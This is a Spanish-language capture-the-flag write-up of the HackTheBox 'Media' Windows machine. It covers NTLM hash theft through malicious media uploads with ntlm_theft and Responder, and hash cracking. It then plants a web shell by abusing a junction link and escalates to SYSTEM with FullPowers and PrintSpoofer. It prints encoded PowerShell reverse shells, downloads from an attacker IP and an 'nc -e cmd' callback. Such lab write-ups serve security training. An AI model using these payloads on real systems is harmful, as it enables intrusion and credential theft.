---
tags:
title: Media - Medium (HTB)
permalink: /Media-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p22,80,3389 10.129.123.117
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-22 01:54 EDT
Nmap scan report for 10.129.123.117
Host is up (0.25s latency).

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
|_http-title: ProMotion Studio
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-10-22T05:54:33+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=MEDIA
| Not valid before: 2025-10-21T05:46:17
|_Not valid after:  2026-04-22T05:46:17
| rdp-ntlm-info: 
|   Target_Name: MEDIA
|   NetBIOS_Domain_Name: MEDIA
|   NetBIOS_Computer_Name: MEDIA
|   DNS_Domain_Name: MEDIA
|   DNS_Computer_Name: MEDIA
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-22T05:54:22+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.64 seconds
```

# Service enumeration 

### HTTP/ Port 80

![Untitled 89](images/Untitled 89.jpg)

En la web no vemos nada de informacion de la que nos podamos aprovechar, solo en la parte inferior de la misma, vemos un formulario.

![Untitled 90](images/Untitled 90.jpg)

Dentro de este formulario ademas de rellenar nuestros datos, podemos subir archivos de video, como por ejemplo `.mp4`, `.wax`, `.wms`, `.asx`, los cuales como dice en el mismo, deben ser compatibles con `Windows Media Player`, podriamos buscar en internet y nos encontrariamos con este [enlace](https://medium.com/@whickey000/creating-malicious-wms-files-malware-mondays-3-d4dbcb06a54f) en el que explica que dentro de un archivo `.wms`, podemos incluir `etiquetas script` de `javascript`, donde dentro de las mismas podemos llamar a funciones como `onload` la cual carga recursos externos indicandole el nombre de una archivo juntos con la `ip`, donde se aloja el mismo. En mi caso probe este metodo pero no me funciono, excepto la herramineto `ntlm-theft` la cual podemos usar para indicarle nuestra `ip`, donde vamos a estar interceptando peticiones o comunaciones con `Responder`.

Clonamos el repo
```bash
git clone https://github.com/Greenwolf/ntlm_theft
```

Y corremos el comando indicandole nuestra `ip`, nombre del archivo, y que archivos queremos generar, en mi caso todos.

```bash
python3 ntlm_theft.py -g all -s 10.10.16.66 -f evil
Created: evil/evil.scf (BROWSE)
Created: evil/evil-(url).url (BROWSE)
Created: evil/evil-(icon).url (BROWSE)
Created: evil/evil.rtf (OPEN)
Created: evil/evil-(stylesheet).xml (OPEN)
Created: evil/evil-(fulldocx).xml (OPEN)
Created: evil/evil.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: evil/evil-(includepicture).docx (OPEN)
Created: evil/evil-(remotetemplate).docx (OPEN)
Created: evil/evil-(frameset).docx (OPEN)
Created: evil/evil.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: evil/evil.asx (OPEN)
Created: evil/evil.jnlp (OPEN)
Created: evil/evil.application (DOWNLOAD AND OPEN)
Created: evil/evil.pdf (OPEN AND ALLOW)
Created: evil/evil-attack-instructions.txt (PASTE TO CHAT)
Generation Complete.
```

## Shell as enox

Ya dentro de la pagina cargamos uno pero antes inciamos `responder`, por la interfaz `tun0`.

```bash
responder -I tun0
```

Lo cargamos en la pagina.

![Untitled 91](images/Untitled 91.jpg)

Y vemos que el mensaje se envia correctamente.

![Untitled 92](images/Untitled 92.jpg)

Y luego de unos segundos como podemos ver..

```bash
responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

<SNIP...>

[SMB] NTLMv2-SSP Client   : 10.129.123.117
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:5b52209eaadcfdea:9D680E9AB1616CEF07B04E2C46A81E4C:01010000000000008001071A0043DC0104958CD02F7F095C0000000002000800410050004D00550001001E00570049004E002D00320038005200420036004F003400330041004C004D0004003400570049004E002D00320038005200420036004F003400330041004C004D002E00410050004D0055002E004C004F00430041004C0003001400410050004D0055002E004C004F00430041004C0005001400410050004D0055002E004C004F00430041004C00070008008001071A0043DC010600040002000000080030003000000000000000000000000030000000827B1ACAFF143B5CD770C93D839D8A0CD2C0921E746BD8DE219779739C3F7C0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00360036000000000000000000                                      
[*] Skipping previously captured hash for MEDIA\enox
[*] Skipping previously captured hash for MEDIA\enox
[*] Skipping previously captured hash for MEDIA\enox
[*] Skipping previously captured hash for MEDIA\enox
[+] Exiting...
```

El hash interceptado lo metemos en un archivo y lo rompemos con `john`.

```bash
john hash -w=/usr/share/wordlists/rockyou.txt            
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1234virus@       (enox)     
1g 0:00:00:02 DONE (2025-10-22 03:18) 0.4545g/s 6065Kp/s 6065Kc/s 6065KC/s 1234à¸–6789..123456789lgr
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Y ahora como sabemos por el escaneo de `nmap`, que el puerto ssh esta abierto, usamos las credenciales para conectarnos

```bash
ssh enox@10.129.123.117          
The authenticity of host '10.129.123.117 (10.129.123.117)' can't be established.
ED25519 key fingerprint is SHA256:2c17FslY2rzanEFkyjgpzSQoyVlsRgRFVJv+0dkFt8A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.123.117' (ED25519) to the list of known hosts.
enox@10.129.123.117's password: 
Permission denied, please try again.
enox@10.129.123.117's password: 
Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

enox@MEDIA C:\Users\enox>
```

## Shell as local service

Una vez dentro de la maquina como el usuario `enox`, vemos que dentro de su directorio `documento`, hay un archivo `.ps1`.

```powershell
enox@MEDIA C:\Users\enox\Documents>dir
 Volume in drive C has no label.
 Volume Serial Number is EAD8-5D48

 Directory of C:\Users\enox\Documents

10/02/2023  11:04 AM    <DIR>          .
10/02/2023  10:26 AM    <DIR>          ..
10/02/2023  06:00 PM             2,841 review.ps1
               1 File(s)          2,841 bytes
               2 Dir(s)   9,817,837,568 bytes free

enox@MEDIA C:\Users\enox\Documents>type review.ps1
function Get-Values {
    param (
        [Parameter(Mandatory = $true)]
        [ValidateScript({Test-Path -Path $_ -PathType Leaf})]
        [string]$FilePath
    )

    # Read the first line of the file
    $firstLine = Get-Content $FilePath -TotalCount 1

    # Extract the values from the first line
    if ($firstLine -match 'Filename: (.+), Random Variable: (.+)') {
        $filename = $Matches[1]
        $randomVariable = $Matches[2]

        # Create a custom object with the extracted values
        $repoValues = [PSCustomObject]@{
            FileName = $filename
            RandomVariable = $randomVariable
        }

        # Return the custom object
        return $repoValues
    }
    else {
        # Return $null if the pattern is not found
        return $null
    }
}

function UpdateTodo {
    param (
        [Parameter(Mandatory = $true)]
        [ValidateScript({Test-Path -Path $_ -PathType Leaf})]
        [string]$FilePath
    )

    # Create a .NET stream reader and writer
    $reader = [System.IO.StreamReader]::new($FilePath)
    $writer = [System.IO.StreamWriter]::new($FilePath + ".tmp")

    # Read the first line and ignore it
    $reader.ReadLine() | Out-Null

    # Copy the remaining lines to a temporary file
    while (-not $reader.EndOfStream) {
        $line = $reader.ReadLine()
        $writer.WriteLine($line)
    }

    # Close the reader and writer
    $reader.Close()
    $writer.Close()

    # Replace the original file with the temporary file
    Remove-Item $FilePath
    Rename-Item -Path ($FilePath + ".tmp") -NewName $FilePath
}

$todofile="C:\\Windows\\Tasks\\Uploads\\todo.txt"
$mediaPlayerPath = "C:\Program Files (x86)\Windows Media Player\wmplayer.exe"


while($True){

    if ((Get-Content -Path $todofile) -eq $null) {
        Write-Host "Todo is empty."
        Sleep 60 # Sleep for 60 seconds before rechecking
    }
    else {
        $result = Get-Values -FilePath $todofile
        $filename = $result.FileName
        $randomVariable = $result.RandomVariable
        Write-Host "FileName: $filename"
        Write-Host "Random Variable: $randomVariable"

        # Opening the File in Windows Media Player
        Start-Process -FilePath $mediaPlayerPath -ArgumentList "C:\Windows\Tasks\uploads\$randomVariable\$filename"

        # Wait for 15 seconds
        Start-Sleep -Seconds 15

        $mediaPlayerProcess = Get-Process -Name "wmplayer" -ErrorAction SilentlyContinue
        if ($mediaPlayerProcess -ne $null) {
            Write-Host "Killing Windows Media Player process."
            Stop-Process -Name "wmplayer" -Force
        }

        # Task Done
        UpdateTodo -FilePath $todofile # Updating C:\Windows\Tasks\Uploads\
        Sleep 15
    }

}
```

Dentro de este archivo vemos que con la herramienta de `wmplayer.exe` se ejecuta lo que esta dentro de `C:\Windows\Tasks\Uploads\` donde se crea una `variable random`, la cual podemos ver que vendria a ser el directorio donde se alojan los archivos que nosotros subimos desde el formulario.

Veamos que hay dentro del directorio.

```powershell
PS C:\Windows\Tasks\uploads>  dir


    Directory: C:\Windows\Tasks\uploads


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/22/2025  12:25 AM                edd40b3ce2b2b6fbaca578b1063c5efb
-a----        10/22/2025  12:26 AM              0 todo.txt
```

Vemos que si, se crea un nombre aleatorio a la carpeta,  y dentro de la carpeta, estan nuestro archivos subidos.

```powershell
PS C:\Windows\Tasks\uploads\edd40b3ce2b2b6fbaca578b1063c5efb> dir


    Directory: C:\Windows\Tasks\uploads\edd40b3ce2b2b6fbaca578b1063c5efb


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/22/2025  12:16 AM            147 evil.asx
-a----        10/21/2025  11:51 PM             40 evil.mp4
-a----        10/21/2025  11:50 PM             40 evil.wmv                                                                                                                                  
-a----        10/22/2025  12:12 AM             96 mal.wax
-a----        10/22/2025  12:03 AM            115 mal.wmv
-a----        10/22/2025  12:25 AM            840 malicious.wmv
```

Ademas sabemos que al parecer la web no es administrada por `enox`, sino por otro user, por que podriamos intentar colocar alguna webshell dentro del directorio de la pagina como `C:\xampp\htdocs`, pero para esto tenemos que hacer que de alguna forma el script apunte y aloje nuestros archivo dentro de ese directorio.

Se me ocurre jugar con links simbolicos, haciendo que de alguna manera que el scritp cuando se ejecute cargue el archivo dentro de la web, para eso primero creamos el simlink.

```powershell
cmd.exe /c mklink /j "C:\Windows\Tasks\Uploads\edd40b3ce2b2b6fbaca578b1063c5efb" "C:\xampp\htdocs"
Junction created for C:\Windows\Tasks\Uploads\edd40b3ce2b2b6fbaca578b1063c5efb <<===>> C:\xampp\htdocs
```

Y ya luego tenemos que cargar el archivo desde la web. Haciendo que cuando el archivo se ejecute de alguna forma piensa q lo deposita dentro del directorio con nombre random pero sabemos que este apunta simbolicamente a `C:\xampp\htdocs`, haciendo que el archivo se cargue dentro de la web.

Subimos el archivo.

![Untitled 93](images/Untitled 93.jpg)

Y ahora como podemos ver el archivo esta dentro de la ruta que queriamos.

```powershell
PS C:\> ls C:\xampp\htdocs\

    Directory: C:\xampp\htdocs

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/2/2023  10:27 AM                assets
d-----         10/2/2023  10:27 AM                css
d-----         10/2/2023  10:27 AM                js
-a----        10/10/2023   5:00 AM          20563 index.php
-a----          9/4/2025  11:12 AM             35 shell.php
```

Ahora comprobamos que dentro de la pagina tengamos ejecucion de comandos con `curl`.

```bash
curl -s -X GET "http://10.129.123.117/cmd.php?cmd=whoami"
nt authority\local service
```

Y como de esta forma podemos ejecutar comandos podemos enviarnos una `Reverse shell`.

```bash
curl -s -X GET "http://10.129.123.117/cmd.php?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANgA2ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA%3D%3D"
```

Y desde nuestro listener anteirormente configurado recibimos la shell.

```bash
rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.16.66] from (UNKNOWN) [10.129.123.117] 58300
whoami
nt authority\local service
PS C:\xampp\htdocs>
```

## Shell as nt authority

Una vez dentro como `local service` vemos listamos privilegios.

```powershell
PS C:\xampp\htdocs> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State   
============================= =================================== ========
SeTcbPrivilege                Act as part of the operating system Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled 
SeCreateGlobalPrivilege       Create global objects               Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                Disabled
```

Vemos que teien el privilegio `SeTcbPrivilege` el cual es uno de los mas poderosos de Windows. Pero como no tenemos el `SeImpersonatePrivilege`, podemos ya que tenemos un gran privilegio reestablecer nuestro privilegios a los default de la maquina, para eso podemos usar `FullPowers` en donde podemos instalarlo desde este [enlace](https://github.com/itm4n/FullPowers).

Lo descargamos a nuestra maqina victima.

```powershell
PS C:\xampp\htdocs> wget http://10.10.16.66/FullPowers.exe -Outfile FullPowers.exe
```

Y lo ejecutamos haciendo que envie una `rev shell` a nuestra otra consola con los privilegios reestablecidos

```powershell
PS C:\programdata> .\FullPowers.exe -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADgAIgAsADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' -z
```

Y desde nuestra otra consola recibimos la shell.

```bash
rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.16.66] from (UNKNOWN) [10.129.123.117] 58304
whoami
nt authority\local service
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State  
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

Ahora que tenmos el `SeImpersonatePrivilege`, podemos usar [PrintSpoofer.exe](https://github.com/itm4n/PrintSpoofer/tree/master/PrintSpoofer) para repetir el proceso pero usando `nc.exe`, para volver a recibir una shell pero esta vez como `authority system`.

Descargamos el `nc.exe` en la maquina victima.

```powershell
PS C:\xampp\htdocs> wget http://10.10.16.66/nc.exe -Outfile nc.exe
```

Y ahora usamos el binario para enviar la shell.

```powershell
PS C:\xampp\htdocs> .\PrintSpoofer64.exe -c "C:\xampp\htdocs\nc.exe 10.10.16.66 443 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

Y como vemos desde nuestra otra consola recibimos nuestra nueva consola como `authority system`.

```powershell
rlwrap -cAr nc -nlvp 443                                                     
listening on [any] 443 ...
connect to [10.10.16.66] from (UNKNOWN) [10.129.123.117] 58308
Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

`~Happy Hacking.`